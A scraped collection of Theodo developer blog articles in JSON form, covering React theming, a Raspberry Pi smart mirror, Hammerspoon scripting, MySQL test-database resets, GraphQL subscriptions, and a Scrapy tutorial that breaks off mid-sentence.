/ hiding certain elements).\n\nAs with any other concept, you should not blindly apply it on your project but rather ask yourself if this is the most suitable solution. The proposed way of personnalizing can be used when different app variants are quite similar. But if your app versions are totally different, having many if in your code will make it hard to maintain. In this case opt for another solution, for example having a separate \u201cmain\u201d file for each version.\nHave you already worked on a ReactJS app with several themes? How did you implement it?\nShare your experience in the comments below or simply let me know if you have any questions or remarks!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tDarya Talanina\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSmart mirrors are straight from science fiction but it turns out that building your own smart mirror isnt just science fiction or Tom Cruise\u2019s favorite activity. Its actually easy to build your own version\u2026 and I will show you how.\nI recently built one to save time each morning by answering this question:\nShould I check for a bike for hire or take the subway?\nThus, I wanted to have several pieces of information instantly such as weather conditions or the number of available bikes around my house.\n\nSupplies\nHere\u2019s what you need:\n\nARaspberry Pi Zero W, or another Raspberry version with Wifi option (10\u20ac)\nA monitor with HDMI-in, I have chosen an old laptop LCD screen (free)\nLCD driver board (19\u20ac)\nA two-way glass mirror\u00a0(20\u20ac)\nA frame for the mirror,\u00a0\u00a0I found an old one in\u00a0my garage (free)\n\nBuilding your smart mirror is surprisingly easy\nA smart mirror consists basically of a mirror with a screen attached to it that displays a static web page filled with all the data you want to show.\u00a0\n\n\n(source:\u00a0https://magicmirror.builders/)\nOne of the most expensive parts of building a smart mirror can be shelling out for a nice two-way mirror. Therefore, a lot of people have been experimenting with building a smart mirror with two-way mirror film on top of regular glass/plastic instead of actual two-way glass, as I did.\n\nRaspberry configuration\nOnce you put all the parts together, you will have to set up your Raspberry Pi:\nInstall Raspbian Jessie OS\nYou can follow this tutorial here:\nhttp://blog.theodo.fr/2017/03/getting-started-headless-on-raspberry-pi-in-10-minutes/\nInstall Chromium\nSince Chromium Web Browser is not available for Raspbian Jessie installed on the ARMv6 RPi models, you can try kweb browser or the custom version of Chromium:\n\r\nwget -qO - http://bintray.com/user/downloadSubjectPublicKey?username=bintray | sudo apt-key add -\r\necho \"deb http://dl.bintray.com/kusti8/chromium-rpi jessie main dev\" | sudo tee -a /etc/apt/sources.list\r\nsudo apt-get update\r\nsudo apt-get install chromium-browser rpi-youtube -y\r\n\nNow, you can display your single page app with:\n\r\nchromium --kiosk https://my.mirror.io\r\n\nFetching data\nSo, lets go back to initial need: display some useful data to help me choose the best transport option! Let\u2019s go into fetching data:\nMy React app is composed of 3 components: Weather, Bikes & Metro which fetch data from the following APIs. You can followthis tutorialto do so, I also usedAxiosnpm module to fetch data.\nFirst of all, I useApixu APIto collect weather information:\nhttps://api.apixu.com/v1/forecast.json?key=token&q=Paris\nwhich gives us current weather and forecast:\n\r\n{\r\n  \"location\": {\r\n    \"name\": \"Paris\",\r\n    \"region\": \"Ile-de-France\",\r\n    \"country\": \"France\",\r\n    \"lat\": 48.87,\r\n    \"lon\": 2.33,\r\n    \"tz_id\": \"Europe/Paris\",\r\n    \"localtime_epoch\": 1515503800,\r\n    \"localtime\": \"2018-01-09 14:16\"\r\n  },\r\n  \"current\": {\r\n    \"last_updated_epoch\": 1515502814,\r\n    \"last_updated\": \"2018-01-09 14:00\",\r\n    \"temp_c\": 6.0,\r\n    \"temp_f\": 42.8,\r\n    \"is_day\": 1\r\n  },\r\n  \"forecast\": {\r\n    \"temp_min_c\": 4.0,\r\n    \"temp_max_c\": 8.2,\r\n    \"condition\": \"cloudy\"\r\n  }\r\n}\r\n\nFor metro data, I preferred this non-official REST API:\nhttps://api-ratp.pierre-grimaud.fr/v3/schedules/metros/13/guy+moquet/R?_format=json\n\r\n\"result\": {\r\n  \"schedules\": [\r\n    {\r\n      \"message\": \"3 mn\",\r\n      \"destination\": \"Chatillon Montrouge\"\r\n    },\r\n    {\r\n      \"message\": \"9 mn\",\r\n      \"destination\": \"Chatillon Montrouge\"\r\n    }\r\n  ]\r\n}\r\n\nLast but not least, I wanted to display how many bikes are available around my place so I usedJCDecaux APIfor a given station (you can get its ID on Citymapper for example):\nhttps://api.jcdecaux.com/vls/v1/stations/18047?contract=Paris&apiKey=token\nBut\u2026\nJCDecaux is no longer in charge of bike for hire service so you will get something like this:\n\r\n{\r\n  \"error\": \"Station not found\"\r\n}\r\n\nThe next company, Smovengo,is working on a upcoming API which will be available in a few weeks. Just be patient \nNext steps\nThis is the very first version of my smart mirror and here are the next updates to come:\n\nReal time traffic information for my roommate who is driving to work most of the time\nUse the new Velib API which will be available in a few weeks\nTranslate it to French because French people are bad at english \n\n \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJean-Philippe Dos Santos\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWhat is Hammerspoon and what can it do for me?\nHow often have you wanted a little something extra out of macOS, or it\u2019s desktop environment, but felt intimidated digging into the unwieldy system APIs? Well, fret no more!\nToday we will build the\u00a0neat little utility illustrated in the gif above and, hopefully, inspire you to build something yourself. To do this, we will be using Hammerspoon, an open-source project, which aims to bring staggeringly powerful macOS desktop automation into the Lua scripting language.\nThis allows you to quickly and easily write Lua code which interacts with the otherwise complicated macOS APIs, such as those for applications, windows, mouse pointers, filesystem objects, audio devices, batteries, screens, low-level keyboard/mouse events, clipboards, location services, wifi, and more.\nHaving been around for a few years, it is encouraging to know that there is a vibrant community developing Hammerspoon \u2014 with features and fixes being merged nearly every day! There is also a handy collection of user submitted snippets, known as \u201cspoons\u201d, which you can easily begin adding to your own configuration. You\u2019ll soon find yourself building up a personalised arsenal of productivity tools, there are few I\u2019ve found particularly helpful:\n\nSeal: pluggable launch bar \u2013 a viable alternative to Alfred;\nCaffeine: temporarily prevent the screen from going to sleep;\nHeadphoneAutoPause: play/pause music players when headphones are connected/disconnected. The reason as to why this isn\u2019t the default behaviour is beyond me\u2026\n\nGetting started with Hammerspoon\nIf you use brew cask, you can install Hammerspoon in seconds by running the command: brew cask install hammerspoon. If you don\u2019t use brew cask (you really should), you can download the latest release from GitHub then drag the application over to your /Applications/ folder. Afterwards, launch Hammerspoon.app and enable accessability.\nHopefully, by now you\u2019re convinced about how powerful Hammerspoon can be. So, let\u2019s give you a taste of how it works and dive into a code example. Having been inspired from a post I saw on /r/unixporn, we shall be creating a quick spoon which allows the user to draw a rectangle on top of the screen only to transform into a terminal window.\nCreate a rectangle which overlays on top of the screen, to indicate the size of the incoming terminal window:\n\nlocal rectanglePreviewColor = '#81ecec'\r\nlocal rectanglePreview = hs.drawing.rectangle(\r\n  hs.geometry.rect(0, 0, 0, 0)\r\n)\r\nrectanglePreview:setStrokeWidth(2)\r\nrectanglePreview:setStrokeColor({ hex=rectanglePreviewColor, alpha=1 })\r\nrectanglePreview:setFillColor({ hex=rectanglePreviewColor, alpha=0.5 })\r\nrectanglePreview:setRoundedRectRadii(2, 2)\r\nrectanglePreview:setStroke(true):setFill(true)\r\nrectanglePreview:setLevel('floating')\r\n\nOne of the really cool things about Hammerspoon is its ability to work alongside Open Scripting Architecture (OSA) languages, such as AppleScript. We\u2019ll be using this to create our new terminal window, with the desired position and size:\n\nlocal function openIterm()\r\n  local frame = rectanglePreview:frame()\r\n  local createItermWithBounds = string.format([[\r\n    if application \"iTerm\" is not running then\r\n      activate application \"iTerm\"\r\n    end if\r\n    tell application \"iTerm\"\r\n      set newWindow to (create window with default profile)\r\n      set the bounds of newWindow to {%i, %i, %i, %i}\r\n    end tell\r\n  ]], frame.x, frame.y, frame.x + frame.w, frame.y + frame.h)\r\n  hs.osascript.applescript(createItermWithBounds)\r\nend\r\n\nListen for when the user moves their mouse, so we can move and resize our rectanglePreview:\n\nlocal fromPoint = nil\r\n\r\nlocal drag_event = hs.eventtap.new(\r\n  { hs.eventtap.event.types.mouseMoved },\r\n  function(e)\r\n    toPoint = hs.mouse.getAbsolutePosition()\r\n    local newFrame = hs.geometry.new({\r\n      [\"x1\"] = fromPoint.x,\r\n      [\"y1\"] = fromPoint.y,\r\n      [\"x2\"] = toPoint.x,\r\n      [\"y2\"] = toPoint.y,\r\n    })\r\n    rectanglePreview:setFrame(newFrame)\r\n\r\n    return nil\r\n  end\r\n)\r\n\nBegin to capture the rectangle drawn by the user, as they hold ctrl + shift. Once released, cease capture, hide the rectangle and then open up our iTerm instance:\n\n  local flags_event =hs.eventtap.new(\r\n  { hs.eventtap.event.types.flagsChanged },\r\n  function(e)\r\n    local flags = e:getFlags()\r\n    if flags.ctrl and flags.shift then\r\n      fromPoint = hs.mouse.getAbsolutePosition()\r\n      local newFrame = hs.geometry.rect(fromPoint.x, fromPoint.y, 0, 0)\r\n      rectanglePreview:setFrame(newFrame)\r\n      drag_event:start()\r\n      rectanglePreview:show()\r\n    elseif fromPoint ~= nil then\r\n      fromPoint = nil\r\n      drag_event:stop()\r\n      rectanglePreview:hide()\r\n      openIterm()\r\n    end\r\n    return nil\r\n  end\r\n)\r\nflags_event:start()\r\n\nAnd that\u2019s all it takes!\nStepping into the future\nFeel free to check out my Hammerspoon config on GitHub, where you can find the coalesced version of the example above, along with my (upcoming) other spoons.\nIf you fancy giving a shot at writing your own spoons, here are a couple ideas to help get your creativity flowing:\n\nMove window focus directionally using the VIM movement keys (HJKL).\nWhen Spotify begins to play a new song, display an alert with the new song title, artist, etc\u2026\nInter-process communication and a simple HTTPServer enable you to trigger Hammerspoon functionality from pretty much any environment.\n\nFun fact: the name Hammerspoon is derived from itself being a \u201cfork\u201d of its lightweight predecessor Mj\u00f6lnir (that being the name of Thor\u2019s hammer \ud83d\udd28).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBraden Marshall\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHaving independent functional tests is a good practice recommended by many developers. It allows you save a great deal of time; and it is well known, time is money!\nWhy\nIf your tests are not independent, it means that the execution of one test can impact the result of the following tests. Dependent tests can in fact fail randomly depending on the order of execution. \nI started working on a small project with a small amount of tests and I did not notice the problem at first. But as we added features, the number of tests increased significantly. And they started failing randomly. The bigger the project, the more difficult it is to understand why tests fail. We lost hours trying to find out the root cause of the failures. Indeed, the cause was not in the failing tests itself, but the failure was due to the execution of one test before. It thus took us a lot of time and energy to maintain our tests on a daily basis. \nTherefore, we decided to solve the problem and make our tests independent in a quick and simple way : reset the database between each test to make them start with a clean set of data. We set one constraint: to not impact the performances !\nLet\u2019s practice\nAs I mentioned before, in order to make our tests independent we chose to reset the database before each test using a dump\nfile. Here are the two main steps of the process:\n\n\nCreate an sql dump from your test database: To run your functional tests, you need to create a database. Right after this\nset up, create a dump of it :\n\n\nmysqldump -u $USER -h $HOST -p $PASSWORD $BDD_NAME > dump_db_test.sql\n\n\nReset your database before each test: Once the dump is created, we will use it to reset the database. You can create\nan AbstractBaseTestCase.php extending the \\PHPUnit_Framework_TestCase. Every functional test file should extend this file. In this file, create a setUp() method which will be run before each of your tests. This method will execute the command to reset the database with the dump file created before :\n\n\nabstract class AbstractBaseTestCase extends \\PHPUnit_Framework_TestCase\r\n    {\r\n        public function setUp()\r\n        {\r\n            $importCommand =\r\n        mysql -h mysqlHost -u mysqlUserName -p mysqlPassword mysqlDatabaseName < mysqlImportFilename;\r\n\r\n            exec($importCommand);\r\n        }\r\n    }\nBefore executing one functional test, this method is executed and it cleans the database. The following test then uses a new set of data and the previous modifications of the database do not impact the running test.\nGoing further\n\nAs you may have noticed, each time you\u2019re using a plaintext password in the command line, a warning is printed in the console.\nTo avoid this you can set up the password as an environment variable.\nExport MYSQL_PWD=\u2019mysqlPassword\u2019\n\nAs a quick solution, we decided to use the same database for each test. It is possible to improve this model and use fixtures\nto load before each test only the ones needed to run the tests.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSophie Moustard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tReal-time has opened new opportunities in web applications.\nBy allowing users to get access to data as soon as it\u2019s available, it provides them a better experience.\nThanks to real-time, you can edit documents collaboratively, play online with your friends, know exactly when your pizza delivery man will arrive or when you will arrive at destination depending of the current traffic.\nIn the past, implementing real-time had a huge cost and was reserved for top companies like Google or Facebook, but nowadays, emergence of real-time technologies and libraries makes it accessible to anyone.\nGraphQL has integrated real-time in its specification with Subscriptions. That means that you can use real-time inside the same api you use for the rest of your application, providing an unique source of communication and a better organization.\nIn this tutorial, you will see how to implement a real-time web application with few lines of codes, using GraphQL, Apollo and React.\nIn order to accomplish this goal, we will build a notification system from scratch in two parts, first we will implement a GraphQL NodeJS express server, then a web application with React.\nThe code referring to this article can be found on GitHub.\n1. The server\n1.1. Bootstrap the GraphQL server\nLet\u2019s start with the initiation of the server.\nCreate a new folder and write the following commands inside:\n\nnpm init or yarn init to generate the package.json file\nnpm install --save express body-parser apollo-server-express graphql-tools or yarn add express body-parser apollo-server-express graphql-tools to install required libraries.\n\nCreate a new file index.js:\nconst express = require('express');\r\nconst bodyParser = require('body-parser');\r\nconst { graphqlExpress, graphiqlExpress } = require('apollo-server-express');\r\nconst { makeExecutableSchema } = require('graphql-tools');\r\n\r\nconst notifications = [];\r\nconst typeDefs = `\r\n  type Query { notifications: [Notification] }\r\n  type Notification { label: String }\r\n`;\r\nconst resolvers = {\r\n  Query: { notifications: () => notifications },\r\n};\r\nconst schema = makeExecutableSchema({ typeDefs, resolvers });\r\n\r\nconst app = express();\r\napp.use('/graphql', bodyParser.json(), graphqlExpress({ schema }));\r\napp.use('/graphiql', graphiqlExpress({ endpointURL: '/graphql' }));\r\napp.listen(4000, () => {\r\n  console.log('Go to http://localhost:4000/graphiql to run queries!');\r\n});\r\n\nCongratulations, you have just created a GraphQL server with Express and Apollo!\nYou can launch it with the command: node index.js.\nIn this server, we added a GraphQL query named notifications that allows us to get all notifications.\nYou can test it with GraphiQL, by going to the adress http://localhost:4000/graphiql and sending the following query (it should return an empty array because there is no notifications available yet):\nquery {\r\n  notifications {\r\n    label\r\n  }\r\n}\r\n\nThe corresponding commit is available here.\n1.2. Add a mutation to the server\nNext, let\u2019s add a mutation that will allow you to push notifications.\nUpdate type definitions and resolvers in index.js:\n...\r\nconst typeDefs = `\r\n  type Query { notifications: [Notification] }\r\n  type Notification { label: String }\r\n  type Mutation { pushNotification(label: String!): Notification }\r\n`;\r\nconst resolvers = {\r\n  Query: { notifications: () => notifications },\r\n  Mutation: {\r\n      pushNotification: (root, args) => {\r\n        const newNotification = { label: args.label };\r\n        notifications.push(newNotification);\r\n\r\n        return newNotification;\r\n      },\r\n  },\r\n};\r\n...\r\n\nThe pushNotification mutation is ready. You can test it in GraphiQL, with:\nmutation {\r\n  pushNotification(label:\"My first notification\") {\r\n    label\r\n  }\r\n}\r\n\nClick here for the commit.\n1.3. Add subscriptions\nThe last step in the building of the server is adding the subscription, to make our server going to real-time.\nAdd the required libraries to use subscriptions: npm install --save graphql-subscriptions http subscriptions-transport-ws cors or yarn add graphql-subscriptions http subscriptions-transport-ws cors\nThen add the subscription newNotification in the GraphQL schema:\nconst { PubSub } = require('graphql-subscriptions');\r\n\r\nconst pubsub = new PubSub();\r\nconst NOTIFICATION_SUBSCRIPTION_TOPIC = 'newNotifications';\r\n...\r\n  type Mutation { pushNotification(label: String!): Notification }\r\n  type Subscription { newNotification: Notification }\r\n...\r\nconst resolvers = {\r\n  Query: { notifications: () => notifications },\r\n  Mutation: {\r\n      pushNotification: (root, args) => {\r\n        const newNotification = { label: args.label };\r\n        notifications.push(newNotification);\r\n\r\n        pubsub.publish(NOTIFICATION_SUBSCRIPTION_TOPIC, { newNotification });\r\n        return newNotification;\r\n      },\r\n  },\r\n  Subscription: {\r\n    newNotification: {\r\n      subscribe: () => pubsub.asyncIterator(NOTIFICATION_SUBSCRIPTION_TOPIC)\r\n    }\r\n  },\r\n};\r\nconst schema = makeExecutableSchema({ typeDefs, resolvers });\r\n\n\nDeclare a PubSub and a topic corresponding to the new Subscription\nDeclare the type definition of the new Subscription called newNotification\nEvery time a new notification is sent via the pushNotification mutation, publish to PubSub with the relevant topic\nSync the new notification Subscription with all events from PubSub instance corresponding to relevant topic\n\nFinally, update the server configuration to provide Subscriptions via WebSockets.\nconst cors = require('cors');\r\nconst { execute, subscribe } = require('graphql');\r\nconst { createServer } = require('http');\r\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\r\n...\r\nconst app = express();\r\napp.use('*', cors({ origin: `http://localhost:3000` })); // allows request from webapp\r\napp.use('/graphql', bodyParser.json(), graphqlExpress({ schema }));\r\napp.use('/graphiql', graphiqlExpress({\r\n  endpointURL: '/graphql',\r\n  subscriptionsEndpoint: `ws://localhost:4000/subscriptions`\r\n}));\r\nconst ws = createServer(app);\r\nws.listen(4000, () => {\r\n  console.log('Go to http://localhost:4000/graphiql to run queries!');\r\n\r\n  new SubscriptionServer({\r\n    execute,\r\n    subscribe,\r\n    schema\r\n  }, {\r\n    server: ws,\r\n    path: '/subscriptions',\r\n  });\r\n});\r\n\nThe server is ready, you can test the new Subscription with GraphiQL.\nUse the following query to display new notifications on a windows.\nsubscription {\r\n  newNotification {\r\n    label\r\n  }\r\n}\r\n\nAnd in another windows, if you push notifications via the mutation created before, you should see data from the subscription being updated.\n\nYou can find the relevant commit here\n2. The React web application\n2.1. Bootstrap the React app\nBootstrap the front-end application with Create React App:\nnpx create-react-app frontend\nCorresponding commit here\n2.2. Add mutation to push notifications\nNext, we will set up Apollo Client to communicate with the GraphQL server.\nInstall the required libraries: npm install --save apollo-boost react-apollo graphql or yarn add apollo-boost react-apollo graphql\nUpdate index.js\n...\r\nimport { ApolloProvider } from 'react-apollo'\r\nimport { ApolloClient } from 'apollo-client'\r\nimport { HttpLink } from 'apollo-link-http'\r\nimport { InMemoryCache } from 'apollo-cache-inmemory'\r\n\r\nconst client = new ApolloClient({\r\n  link: new HttpLink({ uri: 'http://localhost:4000/graphql' }),\r\n  cache: new InMemoryCache()\r\n})\r\n\r\nReactDOM.render(\r\n  <ApolloProvider client={client}>\r\n    <App />\r\n  </ApolloProvider>,\r\n  document.getElementById('root')\r\n);\r\n\nThen create a new component PushNotification that will be used to send pushNotification mutation.\nPushNotification.js\nimport React, { Component } from 'react'\r\nimport { graphql } from 'react-apollo'\r\nimport gql from 'graphql-tag'\r\n\r\nclass PushNotification extends Component {\r\n  state = { label: '' }\r\n\r\n  render() {\r\n    return (\r\n      <div>\r\n        <input\r\n          value={this.state.label}\r\n          onChange={e => this.setState({ label: e.target.value })}\r\n          type=\"text\"\r\n          placeholder=\"A label\"\r\n        />\r\n        <button onClick={() => this._pushNotification()}>Submit</button>\r\n      </div>\r\n    )\r\n  }\r\n\r\n  _pushNotification = async () => {\r\n    const { label } = this.state\r\n    await this.props.pushNotificationMutation({\r\n      variables: {\r\n        label\r\n      }\r\n    })\r\n    this.setState({ label: '' });\r\n  }\r\n}\r\n\r\nconst POST_MUTATION = gql`\r\nmutation PushNotificationMutation($label: String!){\r\n  pushNotification(label: $label) {\r\n    label\r\n  }\r\n}\r\n`\r\n\r\nexport default graphql(POST_MUTATION, { name: 'pushNotificationMutation' })(PushNotification)\r\n\n\nAs the component is wrapped by graphql(POST_MUTATION, { name: 'pushNotificationMutation' })(PushNotification), this component has a prop pushNotification that can be used to call the mutation.\n\nThen call PushNotification in AppComponent\nimport PushNotification from 'PushNotification'\r\n...\r\n  <div className=\"App-intro\">\r\n    <PushNotification/>\r\n  </div>\r\n...\r\n\nWe can now push notifications from the React application! We can check that notifications are sent to the server with GraphiQL.\nCorresponding commit is here\n2.3. Add subscription to get real-time notifications\nThe last step is allowing subscriptions in the React application.\nInstall the required dependencies: npm install --save apollo-link-ws react-toastify or yarn add apollo-link-ws react-toastify.\n\napollo-link-ws enables to send GraphQL operation over WebSockets.\nReact Toastify will be used to push toasts when a notification is received\n\nThen update Apollo Client configuration to use WebSockets\nindex.js\n...\r\nimport { split } from 'apollo-link';\r\nimport { WebSocketLink } from 'apollo-link-ws';\r\nimport { getMainDefinition } from 'apollo-utilities';\r\n\r\nconst httpLink = new HttpLink({ uri: 'http://localhost:4000/graphql' });\r\n\r\nconst wsLink = new WebSocketLink({\r\n  uri: `ws://localhost:4000/subscriptions`,\r\n  options: {\r\n    reconnect: true\r\n  }\r\n});\r\n\r\nconst link = split(\r\n  ({ query }) => {\r\n    const { kind, operation } = getMainDefinition(query);\r\n    return kind === 'OperationDefinition' && operation === 'subscription';\r\n  },\r\n  wsLink,\r\n  httpLink,\r\n);\r\n\r\nconst client = new ApolloClient({\r\n  link,\r\n  cache: new InMemoryCache()\r\n})\r\n...\r\n\nAnd wrap the main App component with the query corresponding to the subscription.\nimport { graphql } from 'react-apollo'\r\nimport gql from 'graphql-tag'\r\nimport { ToastContainer, toast } from 'react-toastify';\r\n\r\nclass App extends Component {\r\n  componentWillReceiveProps({ data: { newNotification: { label } } }) {\r\n    toast(label);\r\n  }\r\n  render() {\r\n    return (\r\n      <div className=\"App\">\r\n        ...\r\n        <ToastContainer />\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nconst subNewNotification = gql`\r\n  subscription {\r\n    newNotification {\r\n      label\r\n    }\r\n  }\r\n`;\r\n\r\nexport default graphql(subNewNotification)(App);\r\n\n\nWhen a component is wrapped with a Subscription, it automatically receives data from the subscription in its props.\nAnother method to receive data from Subscription is using subscribeToMore. This useful method merges the different received objects in your component state with other objects from classic GraphQL queries.\n\nThe notification system is now finished!\n\nFinal commit here\nConclusion\nDuring this tutorial, we learnt how to build a real-time notification system from scratch with GraphQL, Apollo and express.\nThe current system is basic, next step could be adding authentification to push notification only to a specific user.\nTo go further, I highly recommend:\n\nHow to GraphQL\nApollo Docs\n\nDon\u2019t hesitate to give feedback, or share your experiences with real-time GraphQL in comments.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLo\u00efc Carbonne\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tScraping a website means extracting data from a website in a usable way.\nThe ultimate goal when scraping a website is to use the extracted data to build something else.\nIn this article, I will show you how to extract the content of all existing articles of Theodo\u2019s blog with Scrapy, an easy-to-learn, open source Python library used to do data scraping.\nI personally used this data to train a machine learning model that generates new blog articles based on all previous articles (with relative success)!\nImportant:\nBefore we start, you must remember to always read the terms and conditions of a website before you scrape it as the website may have some requirements on how you can legally use its data (usually not for commercial use).\nYou should also make sure that you are not scraping the website too aggressively (sending too many requests in a short period of time) as it may have an impact on the scraped website.\nScrapy\nScrapy is an open source and collaborative framework for extracting data from websites.\nScrapy creates new classes called Spider that define how a website will be scraped by providing the starting URLs and what to do on each crawled page.\nI invite you to read the documentation on Spiders if you want to better understand how scraping is done when using Scrapy\u2019s Spiders.\nScrapy is a Python library that is available with pip.\nTo install it, simply run pip install scrapy.\nYou are now ready to start the tutorial, let\u2019s get to it!\nExtracting all the content of our blog\nYou can find all the code used in this article in the accompanying repository.\nGet the content of a single article\nFirst, what we want to do is retrieve all the content of a single article.\nLet\u2019s create our first Spider. To do that, you can create an article_spider.py file with the following code:\nimport scrapy\r\n\r\n\r\nclass ArticleSpider(scrapy.Spider):\r\n    name = \"article\"\r\n    start_urls = ['http://blog.theodo.fr/2018/02/scrape-websites-5-minutes-scrapy']\r\n\r\n    def parse(self, response):\r\n        content = response.xpath(\".//div[@class='entry-content']/descendant::text()\").extract()\r\n        yield {'article': ''.join(content)}\r\n\nLet\u2019s break everything down!\nFirst we import the scrapy library and we define a new class ArticleSpider derived from the Spider class from scrapy.\nWe define the name of our Spider and the start_urls, the URLs that our Spider will visit (in our case, only the URL of this blog post).\nFinally, we define a parse method that will be executed on each page crawled by our spider.\nIf you inspect the HTML of this page, you will see that all the content of the article is contained in a div of class entry-content.\nScrapy provides an xpath method on the response object (the content of the crawled page) that creates a Selector object useful to select parts of the page.\nIn the xpath method, it will create a Selector based on the xpath language.\nUsing this method, we find the list of the text of all the descendants (divs, spans\u2026) contained in the entry-content block.\nWe then return a dictionary with the content of the article by concatenating this list of text.\nNow, if you want to see the result of this Spider, you can run the command scrapy runspider article_spider.py -o article.json.\nWhen you run this command, Scrapy looks for a Spider definition inside the file and runs it through its crawling engine.\nThe -o flag (or --output) will put the content of our Spider in the article.json file, you can open it and see that we indeed retrieved all the content of the article!\nNavigate through all the articles of a page\nWe now know how to extract the content of an article.\nBut how can we extract the content of all articles contained on a page ?\nTo do this, we need to identify the URLs of each article and use what we learned in the previous section to extract the content of each article.\nWe could use the same Spider as the last section and give all the URLs to the start_urls attribute but that would take a lot of manual time to retrieve all the URLs.\nIn a blog page like this one, you can go to an article by clicking on the title of the article.\nWe must thus find a way to visit all of the articles by clicking on each titles.\nScrapy provides another method on the response object, the css method that also creates a Selector object, but this time based on the CSS language (which is easier to use than xpath).\nIf you inspect the title of an article, you can see that it is a link with a a tag contained in a div of class entry-title.\nSo, to extract all the links of a page, we can use the selector with response.css('.entry-title a ::attr(\"href\")').extract().\nNow let\u2019s put two and two together and create a page_spider.py file with this code:\nimport scrapy\r\n\r\n\r\nclass PageSpider(scrapy.Spider):\r\n    name = \"page\"\r\n    start_urls = ['http://blog.theodo.fr/']\r\n\r\n    def parse(self, response):\r\n        for article_url in response.css('.entry-title a ::attr(\"href\")').extract():\r\n            yield response.follow(article_url, callback=self.parse_article)\r\n\r\n    def parse_article(self, response):\r\n        content = response.xpath(\".//div[@class='entry-content']/descendant::text()\").extract()\r\n        yield {'article': ''.join(content)}\r\n\nWhat our PageSpider is doing here is start on the homepage of our blog and identify the URLs of each article in the page using the css method.\nThen, we use the follow method on each URL to extract the content of each article using the parse_article callback (directly inspired from the first part).\nThe follow method allow us to do a new request and apply a callback on it, this is really useful to do a Spider that navigates through multiple pages.\nIf you run the command scrapy runspider page_spider.py -o page.json, you will see in the page.json output that we retrieved the content of each article of the homepage.\nYou may notice one of the main advantages about Scrapy: requests are scheduled and processed asynchronously.\nThis means that Scrapy doesn\u2019t need to wait for a request to be finished and processed, it can send another request or do other things in the meantime.\nNavigate through all the pages of the blog\nNow that we know how to extract the content of all articles in a page, let\u2019s extract all the content of the blog by going through all the pages of the blog.\nOn each page of the blog, at the bottom of the page, you can see an \u201cOlder posts\u201d button that links to the previous page of the blog.\nTherefore, if we want to visit all pages of the blog, we can start from the first page and click on \u201cOlder posts\u201d until we reach the last page (obviously, the last page of the blog does not contain the button).\nThe \u201cOlder posts\u201d button can be easily identified using the same css method as the previous section with response.css('.nav-previous a ::attr(\"href\")').extract_first().\nNow let\u2019s retrieve all the content of our blog with a blog_spider.py:\nimport scrapy\r\n\r\n\r\nclass BlogSpider(scrapy.Spider):\r\n    name = \"blog\"\r\n    start_urls = ['http://blog.theodo.fr/']\r\n\r\n    def parse(self, response):\r\n        for article_url in response.css('.entry-title a ::attr(\"href\")').extract():\r\n            yield response.follow(article_url, callback=self.parse_article)\r\n        older_posts = response.css('.nav-previous a ::attr(\"href\")').extract_first()\r\n        if older_posts is not None:\r\n            yield response.follow(older_posts, callback=self.parse)\r\n\r\n    def parse_article(self, response):\r\n        content = response.xpath(\".//div[@class='entry-content']/descendant::text()\").extract()\r\n        yield {'article': ''.join(content)}\r\n\nNow, our BlogSpider extracts all URLs of articles and calls the parse_article callback and then extracts the URL of the \u201cOlder posts\u201d button.\nIt then follows the URL and applies the parse callback on the previous page of our blog.\nIf you run the command scrapy runspider blog_spider.py -o blog.json, you will see that our Spider will visit every article page and retrieve the content of each article since the beginning of our blog!\nGoing further\n\nWe could have also used a 